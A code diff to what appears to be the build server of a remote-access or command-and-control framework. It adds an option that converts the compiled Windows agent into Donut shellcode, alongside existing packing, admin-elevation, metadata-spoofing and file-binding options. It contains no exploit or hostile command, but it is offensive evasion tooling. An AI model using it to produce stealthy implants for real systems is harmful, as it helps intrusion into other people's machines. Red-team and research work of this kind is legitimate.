@@ -86,11 +86,29 @@ type BuildProcessConfig = {
   iconBase64?: string;
   enableUpx?: boolean;
   upxStripHeaders?: boolean;
+  enableDonut?: boolean;
   requireAdmin?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
   boundFiles?: BoundFile[];
 };
+
+async function checkDonutAvailable(sendToStream: (data: any) => void): Promise<string | null> {
+  const envBin = process.env.DONUT_BIN?.trim();
+  const candidates = envBin ? [envBin, "donut"] : ["donut"];
+
+  for (const bin of candidates) {
+    try {
+      // .nothrow() suppresses non-zero exits; an exception means the binary wasn't found
+      await $`${bin}`.quiet().nothrow();
+      sendToStream({ type: "output", text: `Donut found: ${bin}\n`, level: "info" });
+      return bin;
+    } catch {
+      // spawn error (ENOENT) — binary not present, try next candidate
+    }
+  }
+  return null;
+}
 
 async function checkUpxAvailable(sendToStream: (data: any) => void): Promise<boolean> {
   try {
@@ -317,6 +335,20 @@ export async function startBuildProcess(
         throw new Error("UPX not found");
       }
       upxBin = "upx";
+    }
+
+    let donutBin: string | null = null;
+    if (config.enableDonut) {
+      const donutFound = await checkDonutAvailable(sendToStream);
+      if (!donutFound) {
+        sendToStream({
+          type: "output",
+          text: "ERROR: Donut is not installed or not found in PATH. Please install Donut (https://github.com/thewover/donut) and ensure it is available on PATH or set DONUT_BIN, then retry.\n",
+          level: "error",
+        });
+        throw new Error("Donut not found");
+      }
+      donutBin = donutFound;
     }
 
     const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64 || config.requireAdmin);
@@ -851,6 +883,43 @@ func runBoundFiles() {
             }
           } catch (upxErr: any) {
             sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
+          }
+        }
+
+        // Donut shellcode conversion (Windows PE → position-independent shellcode)
+        // Runs after UPX so the compressed PE is used as input when both are enabled.
+        // Produces a separate .bin file and leaves the original PE untouched.
+        if (donutBin && os === "windows") {
+          const donutArchMap: Record<string, string> = {
+            amd64: "2",
+            "386": "1",
+          };
+          const donutArch = donutArchMap[actualArch];
+          if (donutArch) {
+            sendToStream({ type: "output", text: `Converting ${outputName} to shellcode with Donut...\n`, level: "info" });
+            const shellcodeName = deps.sanitizeOutputName(outputName.replace(/\.[^/.]+$/, "") + ".bin");
+            const shellcodePath = `${outDir}/${shellcodeName}`;
+            try {
+              const donutResult = await $`${donutBin} -i ${filePath} -o ${shellcodePath} -a ${donutArch}`.nothrow().quiet();
+              if (donutResult.exitCode !== 0) {
+                const errText = (donutResult.stderr.toString() || donutResult.stdout.toString()).trim();
+                sendToStream({ type: "output", text: `WARNING: Donut conversion failed (exit ${donutResult.exitCode}): ${errText}\n`, level: "warn" });
+              } else {
+                const shellcodeSize = Bun.file(shellcodePath).size;
+                sendToStream({ type: "output", text: `Donut shellcode: ${shellcodeSize} bytes → ${shellcodeName}\n`, level: "info" });
+                (build.files as any[]).push({
+                  name: shellcodeName,
+                  filename: shellcodeName,
+                  platform,
+                  version: agentVersion,
+                  size: shellcodeSize,
+                });
+              }
+            } catch (donutErr: any) {
+              sendToStream({ type: "output", text: `WARNING: Donut failed: ${donutErr.message || donutErr}\n`, level: "warn" });
+            }
+          } else {
+            sendToStream({ type: "output", text: `WARNING: Donut shellcode conversion skipped for ${platform} (ARM not supported by Donut)\n`, level: "warn" });
           }
         }
 
